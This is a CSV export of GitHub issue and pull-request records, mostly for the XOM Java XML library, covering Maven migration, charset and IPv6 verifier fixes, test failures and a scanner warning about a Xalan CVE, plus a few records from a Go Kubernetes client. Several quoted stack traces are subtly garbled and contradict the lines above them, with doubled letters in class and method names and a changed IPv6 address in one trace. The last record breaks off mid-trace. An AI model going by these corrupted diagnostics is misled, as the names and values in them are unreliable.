elharo,xom,https://api.github.com/repos/elharo/xom/issues/35,302003442,MDU6SXNzdWUzMDIwMDM0NDI=,35,Make integration tests work without manual setup and download,1005544,open,FALSE,NA,NA,0,2018-03-03T14:46:42Z,2018-07-14T13:55:14Z,NA,OWNER,NA,Maybe use ant `get` tasks to load relevant data,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/35/labels{/name},https://api.github.com/repos/elharo/xom/issues/35/comments,https://api.github.com/repos/elharo/xom/issues/35/events,https://github.com/elharo/xom/issues/35,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/34,302003330,MDU6SXNzdWUzMDIwMDMzMzA=,34,Update Bundle-RequiredExecutionEnvironment,1005544,closed,FALSE,NA,NA,0,2018-03-03T14:45:15Z,2018-03-03T16:30:10Z,2018-03-03T16:30:10Z,OWNER,NA,"```
      	<attribute name=""Bundle-RequiredExecutionEnvironment"" value=""JavaSE-1.6""/>
```",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/34/labels{/name},https://api.github.com/repos/elharo/xom/issues/34/comments,https://api.github.com/repos/elharo/xom/issues/34/events,https://github.com/elharo/xom/issues/34,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/33,301998797,MDExOlB1bGxSZXF1ZXN0MTcyNjY3NjIw,33,Fix XPath test,1005544,closed,FALSE,NA,NA,0,2018-03-03T13:37:38Z,2018-03-03T13:37:53Z,2018-03-03T13:37:49Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/33/labels{/name},https://api.github.com/repos/elharo/xom/issues/33/comments,https://api.github.com/repos/elharo/xom/issues/33/events,https://github.com/elharo/xom/pull/33,https://api.github.com/repos/elharo/xom/pulls/33
elharo,xom,https://api.github.com/repos/elharo/xom/issues/32,301992711,MDU6SXNzdWUzMDE5OTI3MTE=,32,xom/classes15/nu/xom/ isn't needed,1005544,closed,FALSE,NA,NA,0,2018-03-03T12:00:28Z,2018-03-03T17:17:34Z,2018-03-03T17:17:34Z,OWNER,NA,No longer need to support pre Java 1.5. This can be moved into the main code base.,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/32/labels{/name},https://api.github.com/repos/elharo/xom/issues/32/comments,https://api.github.com/repos/elharo/xom/issues/32/events,https://github.com/elharo/xom/issues/32,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/31,301992568,MDExOlB1bGxSZXF1ZXN0MTcyNjY0MDc4,31,more modern charset detection,1005544,closed,FALSE,NA,NA,0,2018-03-03T11:58:06Z,2018-03-03T11:58:22Z,2018-03-03T11:58:19Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/31/labels{/name},https://api.github.com/repos/elharo/xom/issues/31/comments,https://api.github.com/repos/elharo/xom/issues/31/events,https://github.com/elharo/xom/pull/31,https://api.github.com/repos/elharo/xom/pulls/31
elharo,xom,https://api.github.com/repos/elharo/xom/issues/30,301778450,MDExOlB1bGxSZXF1ZXN0MTcyNTEyMTgx,30,hack to fix ISO-2022-JP,1005544,closed,FALSE,NA,NA,0,2018-03-02T14:12:01Z,2018-03-02T14:12:13Z,2018-03-02T14:12:10Z,OWNER,NA,fix #13 ,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/30/labels{/name},https://api.github.com/repos/elharo/xom/issues/30/comments,https://api.github.com/repos/elharo/xom/issues/30/events,https://github.com/elharo/xom/pull/30,https://api.github.com/repos/elharo/xom/pulls/30
elharo,xom,https://api.github.com/repos/elharo/xom/issues/29,301766214,MDExOlB1bGxSZXF1ZXN0MTcyNTAyOTU4,29,fix bug in verifier with leading + in IPv4 parts of IPv6 addresses,1005544,closed,FALSE,NA,NA,0,2018-03-02T13:29:14Z,2018-03-02T13:29:26Z,2018-03-02T13:29:22Z,OWNER,NA,fix #12 ,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/29/labels{/name},https://api.github.com/repos/elharo/xom/issues/29/comments,https://api.github.com/repos/elharo/xom/issues/29/events,https://github.com/elharo/xom/pull/29,https://api.github.com/repos/elharo/xom/pulls/29
elharo,xom,https://api.github.com/repos/elharo/xom/issues/28,301748936,MDExOlB1bGxSZXF1ZXN0MTcyNDkwMDgy,28,default memory limits to off,1005544,closed,FALSE,NA,NA,0,2018-03-02T12:20:33Z,2018-03-02T12:20:49Z,2018-03-02T12:20:45Z,OWNER,NA,fix #25 ,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/28/labels{/name},https://api.github.com/repos/elharo/xom/issues/28/comments,https://api.github.com/repos/elharo/xom/issues/28/events,https://github.com/elharo/xom/pull/28,https://api.github.com/repos/elharo/xom/pulls/28
elharo,xom,https://api.github.com/repos/elharo/xom/issues/27,301015432,MDU6SXNzdWUzMDEwMTU0MzI=,27,Setup continuous integration,1005544,closed,FALSE,NA,NA,6,2018-02-28T13:02:01Z,2018-07-23T13:45:23Z,2018-07-23T13:45:23Z,OWNER,NA,Once all tests are passing again.,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/27/labels{/name},https://api.github.com/repos/elharo/xom/issues/27/comments,https://api.github.com/repos/elharo/xom/issues/27/events,https://github.com/elharo/xom/issues/27,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/26,301015248,MDU6SXNzdWUzMDEwMTUyNDg=,26,EncodingTest and GenericWriter can now use the Charset class,1005544,closed,FALSE,1005544,NA,0,2018-02-28T13:01:25Z,2018-03-03T11:59:05Z,2018-03-03T11:59:05Z,OWNER,NA,"That is, get rid of this hack:

```
    private static boolean charsetAvailable(String name) {
        // hack to avoid using 1.4 classes
        try {
            ""d"".getBytes(name);
            return true;
        }
        catch (UnsupportedEncodingException ex) {
            return false;   
        }        
        
    }
```",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/26/labels{/name},https://api.github.com/repos/elharo/xom/issues/26/comments,https://api.github.com/repos/elharo/xom/issues/26/events,https://github.com/elharo/xom/issues/26,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/25,301014688,MDU6SXNzdWUzMDEwMTQ2ODg=,25,Make document size feature optional,1005544,closed,FALSE,NA,NA,0,2018-02-28T12:59:32Z,2018-03-02T12:20:45Z,2018-03-02T12:20:45Z,OWNER,NA,"That is, no limit by default. Not sure this actually works.",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/25/labels{/name},https://api.github.com/repos/elharo/xom/issues/25/comments,https://api.github.com/repos/elharo/xom/issues/25/events,https://github.com/elharo/xom/issues/25,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/24,301014468,MDU6SXNzdWUzMDEwMTQ0Njg=,24,web site still points to java.net,1005544,closed,FALSE,NA,NA,0,2018-02-28T12:58:52Z,2018-03-03T20:31:01Z,2018-03-03T20:31:01Z,OWNER,NA,revise to point to github,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/24/labels{/name},https://api.github.com/repos/elharo/xom/issues/24/comments,https://api.github.com/repos/elharo/xom/issues/24/events,https://github.com/elharo/xom/issues/24,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/23,301008480,MDExOlB1bGxSZXF1ZXN0MTcxOTQxNTQy,23,More memory for encoding test,1005544,closed,FALSE,NA,NA,0,2018-02-28T12:38:28Z,2018-07-14T12:55:39Z,2018-02-28T12:38:40Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/23/labels{/name},https://api.github.com/repos/elharo/xom/issues/23/comments,https://api.github.com/repos/elharo/xom/issues/23/events,https://github.com/elharo/xom/pull/23,https://api.github.com/repos/elharo/xom/pulls/23
elharo,xom,https://api.github.com/repos/elharo/xom/issues/22,299974342,MDExOlB1bGxSZXF1ZXN0MTcxMTk4NTc1,22,Xalan 2.7.2,1005544,closed,FALSE,NA,NA,0,2018-02-24T21:30:07Z,2018-02-24T21:30:19Z,2018-02-24T21:30:14Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/22/labels{/name},https://api.github.com/repos/elharo/xom/issues/22/comments,https://api.github.com/repos/elharo/xom/issues/22/events,https://github.com/elharo/xom/pull/22,https://api.github.com/repos/elharo/xom/pulls/22
elharo,xom,https://api.github.com/repos/elharo/xom/issues/21,299973916,MDExOlB1bGxSZXF1ZXN0MTcxMTk4MzEx,21,ignore more,1005544,closed,FALSE,NA,NA,0,2018-02-24T21:24:03Z,2018-02-24T21:24:15Z,2018-02-24T21:24:12Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/21/labels{/name},https://api.github.com/repos/elharo/xom/issues/21/comments,https://api.github.com/repos/elharo/xom/issues/21/events,https://github.com/elharo/xom/pull/21,https://api.github.com/repos/elharo/xom/pulls/21
elharo,xom,https://api.github.com/repos/elharo/xom/issues/20,299972077,MDExOlB1bGxSZXF1ZXN0MTcxMTk3MTg5,20,Java 1.6 source and target,1005544,closed,FALSE,NA,NA,0,2018-02-24T20:56:03Z,2018-07-14T12:55:45Z,2018-02-24T20:56:13Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/20/labels{/name},https://api.github.com/repos/elharo/xom/issues/20/comments,https://api.github.com/repos/elharo/xom/issues/20/events,https://github.com/elharo/xom/pull/20,https://api.github.com/repos/elharo/xom/pulls/20
elharo,xom,https://api.github.com/repos/elharo/xom/issues/19,281608952,MDU6SXNzdWUyODE2MDg5NTI=,19,tag for 1.2.10,12835340,closed,FALSE,NA,NA,2,2017-12-13T02:56:54Z,2017-12-13T15:46:15Z,2017-12-13T15:24:09Z,NONE,NA,"Seem to be missing a tag for 1.2.10/XOM_1210 maybe 1f1d628, ```git tag XOM_1210 1f1d628``` thank  you! :)",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/19/labels{/name},https://api.github.com/repos/elharo/xom/issues/19/comments,https://api.github.com/repos/elharo/xom/issues/19/events,https://github.com/elharo/xom/issues/19,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/18,239256891,MDU6SXNzdWUyMzkyNTY4OTE=,18,Add location information to Node class,124581,closed,FALSE,NA,NA,10,2017-06-28T18:38:31Z,2018-07-21T13:13:46Z,2017-06-29T11:18:43Z,NONE,NA,"It would be useful to have optional location information (line, column, character offset int fields, and ideally base URI or some way to acquire it) on the Node class which would allow better diagnostics to be presented to users in the event of an application error.

Such a solution should be resilient with respect to XInclude, so that a node which is examined would have the location information of the physical document that the Node in question originated from.  Also it would be useful to be able to recursively list the include points in this case so the user can understand exactly how the document was included.  Making the location information mutable might also be handy in cases where a XOM tree is built up programmatically.

This would also be useful in creating adapters between StAX and XOM, which is an idea I'm tinkering with at the moment.

The memory overhead should be very minimal (four fields totalling around 16-20 bytes per Node typically).

WDYT?",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/18/labels{/name},https://api.github.com/repos/elharo/xom/issues/18/comments,https://api.github.com/repos/elharo/xom/issues/18/events,https://github.com/elharo/xom/issues/18,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/17,221951420,MDU6SXNzdWUyMjE5NTE0MjA=,17,Update xalan dep to 2.7.2,1921009,closed,FALSE,NA,NA,1,2017-04-15T14:26:59Z,2018-02-24T21:36:04Z,2018-02-24T21:36:04Z,NONE,NA,"Having used the ossindex-maven-plugin on a maven project that uses xom 1.2.10 (via com.io7m.xom on Maven central), I see the following warning:

```bash
mvn compile net.ossindex:ossindex-maven-plugin:audit
...snip...

[ERROR] xalan:xalan:2.7.0  [VULNERABLE]
[ERROR]   required by com.io7m.xom:xom:1.2.10
[ERROR] 1 known vulnerabilities, 1 affecting installed version
[ERROR] 
[ERROR] [CVE-2014-0107]  Permissions, Privileges, and Access Controls
[ERROR] https://ossindex.net/resource/cve/359764
[ERROR] The TransformerFactory in Apache Xalan-Java before 2.7.2 does not properly restrict access to certain properties when FEATURE_SECURE_PROCESSING is enabled, which allows remote attackers to bypass expected restrictions and load arbitrary classes or access external resources via a crafted (1) xalan:content-header, (2) xalan:entities, (3) xslt:content-header, or (4) xslt:entities property, or a Java property that is bound to the XSLT 1.0 system-property function.
[ERROR] 
[ERROR] --------------------------------------------------------------
[ERROR] 
```",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/17/labels{/name},https://api.github.com/repos/elharo/xom/issues/17/comments,https://api.github.com/repos/elharo/xom/issues/17/events,https://github.com/elharo/xom/issues/17,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/16,207492238,MDExOlB1bGxSZXF1ZXN0MTA2MDg3NDgz,16,Reorganize the project to mostly-Maven conventions,612494,closed,FALSE,NA,NA,4,2017-02-14T11:40:53Z,2019-03-31T13:50:53Z,2019-03-31T13:50:53Z,NONE,NA,"Hello!

I began looking at the existing POM files, and after pulling on the initial thread I ended up unravelling the entire garment and ended up replacing the entire build system with a modern Maven-based implementation. There are a few new test failures, the causes of which I've not yet tracked down but which are almost certainly caused by resource files no longer being where the test suite assumes they are. See the rather lengthy commit message for details!

I can deploy the packages to Central (see #1) with or without these changes, so it's entirely up to you whether or not you integrate them. By the time this pull request has been posted, you should have received my signed contributor agreement at your published address.

```
This commit encompasses a number of changes to convert the project
from a traditional Ant-style build into a more modern Maven-style
build. This comes with the usual benefits of declarative dependency
management, easy deployment to Maven Central, centralization of project
metadata such as version numbers, the removal of fragile imperative
build scripts, better IDE support, and the production of *correct*
OSGi bundles by default.

Some trade-offs were made between strictly following Maven
conventions, and producing build artifacts that look and behave
the same as previous XOM releases. The choice was made to preserve
compatibility in preference to arguably more solid engineering
practices: No attempt was made to modularize the codebase, and the
general approach taken by the Ant build was minimally transformed
into its Maven equivalent. Primarily, this commit defines a new POM
file and moves the project sources into something fairly close to
the standard Maven conventions.

  * The bulk of the sources moved from src to src/main/java
  * The contents of ""fatsrc"" (the String based Text object
    implementation) were moved to src/main/java-fat
  * The default Text object implementation was moved from src
    to src/main/java-lowfat
  * Sample code was moved to src/samples/java
  * Unit tests were moved to src/test/java
  * Resource files such as characters.dat were moved from src
    to src/main/resources
  * The <= JDK 1.5 sources were moved to src/main/java-jdk15

This division of source files allows for stronger separation of
dependencies: The library previously declared a non-optional dependency
on JUnit simply because the test files lived in the same source tree.
A few very minimal code changes were required to look up resources
in /nu/xom instead of /src/java/nu/xom. This junit dependency actually
prevented the XOM bundle from resolving inside OSGi containers unless
the not-currently-OSGi-compatible junit package was deployed inside
the container.

The custom Ant tasks have been turned into Maven profiles: Enabling
the ""nu.xom.lowfat"" profile adds the src/main/java-lowfat directory
to the build. This happens by default. Enabling the ""nu.xom.fat""
profile instead adds the src/main/java-fat directory to the build.
The ""nu.xom.jdk15"" profile is enabled if a JDK older than 1.6 is
detected, and this adds the src/main/java-jdk15 directory to the
build. Finally, the ""nu.xom.deployment"" profile is enabled if a
""nu.xom.deployment"" property is defined in the environment (via
Maven's ~/.m2/settings.xml or on the command line with -D). This is
provided to conditionally enable the PGP signing of all artifacts
for deployment to Maven Central.

Additionally, this commit folds the website generation work
into declarations bound to the standard Maven ""site"" phase. It
uses the maven-source-plugin and maven-javadoc-plugin to generate
Central-compliant source and javadoc JARs that work nicely in IDEs.
The POM file also contains accurate links to the current mailing list,
issue tracker, GitHub source repos, etc. The Apache Felix Maven Bundle
plugin is used to produce JAR files that have manifests identical to
those produced by the old Ant task whilst also containing somewhat more
""correct"" OSGi metadata.
```

Affects #8
Affects #1",NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/16/labels{/name},https://api.github.com/repos/elharo/xom/issues/16/comments,https://api.github.com/repos/elharo/xom/issues/16/events,https://github.com/elharo/xom/pull/16,https://api.github.com/repos/elharo/xom/pulls/16
elharo,xom,https://api.github.com/repos/elharo/xom/issues/15,207309594,MDU6SXNzdWUyMDczMDk1OTQ=,15,Test failure: testXIncludeTestSuite,612494,open,FALSE,1005544,NA,5,2017-02-13T19:04:58Z,2018-07-14T13:55:29Z,NA,NONE,NA,"In nu.xom.tests.XIncludeTest:

```
White spaces are required between publicId and systemId.

nu.xom.ParsingException: White spaces are required between publicId and systemId. at line 1, column 50 in http://dev.w3.org/cvsweb/~checkout~/2001/XInclude-Test-Suite/testdescr.xml?content-type=text/plain&only_with_tag=HEAD
at nu.xom.Builder.build(Unknown Source)
at nu.xom.Builder.build(Unknown Source)
at nu.xom.tests.XIncludeTest.testXIncludeTestSuite(Unknown Source)
Caused by: org.xml.sax.SAXParseException; systemId: http://dev.w3.org/cvsweb/~checkout~/2001/XInclude-Test-Suite/testdescr.xml?content-type=text/plain&only_with_tag=HEAD; lineNumber: 1; columnNumber: 50; White spaces are required between publicId and systemId.
at org.apache.xerces.parsers.AbstrractSAXParser.parse(Unknown Source)
```

Suspect this one is down to bit rot as well: Perhaps something changed on `w3.org`?",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/15/labels{/name},https://api.github.com/repos/elharo/xom/issues/15/comments,https://api.github.com/repos/elharo/xom/issues/15/events,https://github.com/elharo/xom/issues/15,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/14,207309244,MDU6SXNzdWUyMDczMDkyNDQ=,14,Test failure: testRelativeURIResolutionAgainstARedirectedBase,612494,closed,FALSE,NA,NA,2,2017-02-13T19:03:33Z,2018-02-28T12:39:11Z,2018-02-28T12:39:11Z,NONE,NA,"In `nu.xom.tests.BaseURITest`:

```
expected:<...cafeconleche.org...> but was:<...ibiblio.org/xml...>

junit.framework.ComparisonFailure: expected:<...cafeconleche.org...> but was:<...ibiblio.org/xml....>
at nu.xom.tests.BaseURITest.testRelativeURIResolutionAgainstARedirectedBase(Unknown Source)
```

Not the most helpful message there. I suspect this one is down to something having changed on the server since these tests were written.",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/14/labels{/name},https://api.github.com/repos/elharo/xom/issues/14/comments,https://api.github.com/repos/elharo/xom/issues/14/events,https://github.com/elharo/xom/issues/14,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/13,207308905,MDU6SXNzdWUyMDczMDg5MDU=,13,Test failure: testISO2022JP,612494,closed,FALSE,1005544,NA,3,2017-02-13T19:02:10Z,2018-03-02T14:12:10Z,2018-03-02T14:12:10Z,NONE,NA,"In `nu.xom.tests.EncodingTest`:

```
expected:<128> but was:<65311>

junit.framework.AssertionFailedError: expected:<128> but was:<<65311>
at nu.xom.tests.EncodiingTest.checkAll(Unknown Source)
at nu.xom.tests.EncodingTest..testISO2022JP(Unknown Source)
```",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/13/labels{/name},https://api.github.com/repos/elharo/xom/issues/13/comments,https://api.github.com/repos/elharo/xom/issues/13/events,https://github.com/elharo/xom/issues/13,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/12,207308618,MDU6SXNzdWUyMDczMDg2MTg=,12,Test failure: testIllegalIP6Addresses,612494,closed,FALSE,NA,NA,2,2017-02-13T19:00:57Z,2018-03-02T13:29:22Z,2018-03-02T13:29:22Z,NONE,NA,"In `nu.xom.tests.VerifierTest`:

```
Allowed illegal IPv6 address: ::FFFF:129.144.52.+22

junit.framework.AssertionFailedError: Allowed illegal IPv6 address: ::FFFF:129.1144.52.+22
at nu.xom.tests.VerifierTest.testIIllegalIP6Addresses(Unknown Source)
```",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/12/labels{/name},https://api.github.com/repos/elharo/xom/issues/12/comments,https://api.github.com/repos/elharo/xom/issues/12/events,https://github.com/elharo/xom/issues/12,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/11,194796751,MDExOlB1bGxSZXF1ZXN0OTc0Mzk1OTI=,11,add some of the website to the repo,1005544,closed,FALSE,NA,NA,0,2016-12-10T22:00:36Z,2016-12-10T22:00:45Z,2016-12-10T22:00:45Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/11/labels{/name},https://api.github.com/repos/elharo/xom/issues/11/comments,https://api.github.com/repos/elharo/xom/issues/11/events,https://github.com/elharo/xom/pull/11,https://api.github.com/repos/elharo/xom/pulls/11
elharo,xom,https://api.github.com/repos/elharo/xom/issues/10,194782465,MDExOlB1bGxSZXF1ZXN0OTc0MzI2MjU=,10,.gitignore,1005544,closed,FALSE,NA,NA,0,2016-12-10T18:01:11Z,2016-12-10T18:01:15Z,2016-12-10T18:01:15Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/10/labels{/name},https://api.github.com/repos/elharo/xom/issues/10/comments,https://api.github.com/repos/elharo/xom/issues/10/events,https://github.com/elharo/xom/pull/10,https://api.github.com/repos/elharo/xom/pulls/10
elharo,xom,https://api.github.com/repos/elharo/xom/issues/9,194778044,MDU6SXNzdWUxOTQ3NzgwNDQ=,9,Remove ICU4J from docs,1005544,closed,FALSE,NA,NA,0,2016-12-10T16:38:31Z,2016-12-10T16:39:35Z,2016-12-10T16:39:35Z,OWNER,NA,and licenses. It hasn't been included since 1.1.,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/9/labels{/name},https://api.github.com/repos/elharo/xom/issues/9/comments,https://api.github.com/repos/elharo/xom/issues/9/events,https://github.com/elharo/xom/issues/9,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/8,194774932,MDU6SXNzdWUxOTQ3NzQ5MzI=,8,Better build for docs,1005544,closed,FALSE,NA,NA,0,2016-12-10T15:45:11Z,2020-01-26T12:42:09Z,2020-01-26T12:42:09Z,OWNER,NA,Maybe even based on maven,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/8/labels{/name},https://api.github.com/repos/elharo/xom/issues/8/comments,https://api.github.com/repos/elharo/xom/issues/8/events,https://github.com/elharo/xom/issues/8,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/7,193366092,MDU6SXNzdWUxOTMzNjYwOTI=,7,nux is gone,1005544,closed,FALSE,NA,NA,1,2016-12-04T18:23:49Z,2016-12-10T16:39:16Z,2016-12-10T16:39:16Z,OWNER,NA,remove from sidebar on website,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/7/labels{/name},https://api.github.com/repos/elharo/xom/issues/7/comments,https://api.github.com/repos/elharo/xom/issues/7/events,https://github.com/elharo/xom/issues/7,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/6,193366043,MDU6SXNzdWUxOTMzNjYwNDM=,6,Third party license links are broken,1005544,closed,FALSE,NA,NA,1,2016-12-04T18:22:46Z,2016-12-10T16:58:56Z,2016-12-10T16:58:56Z,OWNER,NA,on website,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/6/labels{/name},https://api.github.com/repos/elharo/xom/issues/6/comments,https://api.github.com/repos/elharo/xom/issues/6/events,https://github.com/elharo/xom/issues/6,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/5,193366028,MDU6SXNzdWUxOTMzNjYwMjg=,5,sample links are broken on website,1005544,closed,FALSE,NA,NA,1,2016-12-04T18:22:33Z,2016-12-10T16:41:04Z,2016-12-10T16:41:04Z,OWNER,NA,They point to java.net. Need to point to github.,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/5/labels{/name},https://api.github.com/repos/elharo/xom/issues/5/comments,https://api.github.com/repos/elharo/xom/issues/5/events,https://github.com/elharo/xom/issues/5,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/4,193366004,MDU6SXNzdWUxOTMzNjYwMDQ=,4,ICU4J license,1005544,closed,FALSE,NA,NA,1,2016-12-04T18:22:09Z,2016-12-10T16:59:08Z,2016-12-10T16:59:08Z,OWNER,NA,ICU4J is no longer used in XOM. Pull the license off the website.,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/4/labels{/name},https://api.github.com/repos/elharo/xom/issues/4/comments,https://api.github.com/repos/elharo/xom/issues/4/events,https://github.com/elharo/xom/issues/4,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/3,190682031,MDU6SXNzdWUxOTA2ODIwMzE=,3,sign the jar,1005544,open,FALSE,NA,NA,0,2016-11-21T10:54:40Z,2018-07-14T13:56:57Z,NA,OWNER,NA,,NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/3/labels{/name},https://api.github.com/repos/elharo/xom/issues/3/comments,https://api.github.com/repos/elharo/xom/issues/3/events,https://github.com/elharo/xom/issues/3,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/2,182990490,MDU6SXNzdWUxODI5OTA0OTA=,2,Add Maven documentation,550915,closed,FALSE,NA,NA,2,2016-10-14T08:21:21Z,2016-11-03T12:05:03Z,2016-10-14T09:47:00Z,NONE,NA,"It would be good to add some additional Maven documentation to the project files to tell which version should be gotten from where.

Currently you have xom : xom containing up to 1.2.5 and com.io7m.xom : xom containing just 1.2.10 in the central Maven repository. Combined with 1.2.10 missing here on GitHub (issue #1) it's doesn't give developers the assurance which version they should get from where. For me it feels like 1.2.10 has now been added by a 3rd party, which makes it less trustworthy.
",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/2/labels{/name},https://api.github.com/repos/elharo/xom/issues/2/comments,https://api.github.com/repos/elharo/xom/issues/2/events,https://github.com/elharo/xom/issues/2,NA
elharo,xom,https://api.github.com/repos/elharo/xom/issues/1,176216818,MDU6SXNzdWUxNzYyMTY4MTg=,1,Missing 1.2.10 release,5905540,closed,FALSE,NA,NA,6,2016-09-11T03:15:52Z,2018-02-28T12:39:51Z,2018-02-28T12:39:51Z,NONE,NA,"Latest release is v1.2.10 from:
http://www.cafeconleche.org/XOM/
",NA,FALSE,https://api.github.com/repos/elharo/xom,https://api.github.com/repos/elharo/xom/issues/1/labels{/name},https://api.github.com/repos/elharo/xom/issues/1/comments,https://api.github.com/repos/elharo/xom/issues/1/events,https://github.com/elharo/xom/issues/1,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/128,741132017,MDExOlB1bGxSZXF1ZXN0NTE5NTAwNjg4,128,Update to k8s 1.18.10,31839142,open,TRUE,NA,NA,0,2020-11-11T23:07:33Z,2020-11-11T23:12:37Z,NA,NONE,NA,"I wanted to update to use a more up to date API version. 

This client is still useful since its a bit slimmer than the standard k8s client.  

If there are any steps missing please let me know. 

- Update Makefile
- Use Go 1.15
- update scripts
- Update apis to k8s 1.18.10
",NA,TRUE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/128/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/128/comments,https://api.github.com/repos/ericchiang/k8s/issues/128/events,https://github.com/ericchiang/k8s/pull/128,https://api.github.com/repos/ericchiang/k8s/pulls/128
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/127,682648764,MDU6SXNzdWU2ODI2NDg3NjQ=,127,Update Release ,434575,open,TRUE,NA,NA,0,2020-08-20T11:45:31Z,2020-08-20T11:45:31Z,NA,NONE,NA,"The latest release is v1.2.0 ( on 23 Aug 2018 )  and it has not got all the master changes. 
Is it possible to create a new release with all the master changes? ",NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/127/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/127/comments,https://api.github.com/repos/ericchiang/k8s/issues/127/events,https://github.com/ericchiang/k8s/issues/127,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/126,649034394,MDU6SXNzdWU2NDkwMzQzOTQ=,126,Add support for k8s jobs,67696199,closed,TRUE,NA,NA,1,2020-07-01T14:36:21Z,2020-07-02T20:16:30Z,2020-07-02T20:16:30Z,NONE,NA,Could you add support for jobs to [apps/v1](https://github.com/ericchiang/k8s/blob/master/apis/apps/v1/register.go)? ,NA,FALSE,https://api.github.com/repos/ericchiang/k8s,https://api.github.com/repos/ericchiang/k8s/issues/126/labels{/name},https://api.github.com/repos/ericchiang/k8s/issues/126/comments,https://api.github.com/repos/ericchiang/k8s/issues/126/events,https://github.com/ericchiang/k8s/issues/126,NA
ericchiang,k8s,https://api.github.com/repos/ericchiang/k8s/issues/125,639635136,MDU6SXNzdWU2Mzk2MzUxMzY=,125,Update protobuf dependency,62966490,open,TRUE,NA,NA,1,2020-06-16T12:45:00Z,2020-08-19T09:29:27Z,NA,NONE,NA,"Hello,

We have been using the client for the last few months without problem until we had to update protobuf to be able to use the https://github.com/google/go-containerregistry project.

This leads to the following panic upon initialization:

```
panic: mismatching message name: got k8s.io.kubernetes.pkg.watch.versioned.Event, want github.com/ericchiang.k8s.watch.versioned.Event

goroutine 1 [running]:
google.golang.org/protobuf/internal/impl.legacyLoadMessageDesc(0x55ba9b96e7e0, 0x55ba9b8f6140, 0x55ba9b735203, 0x2f, 0x0, 0x0)
	/vendor/google.golang.org/protobuf/internal/impl/legacy_message.go:136 +0x884
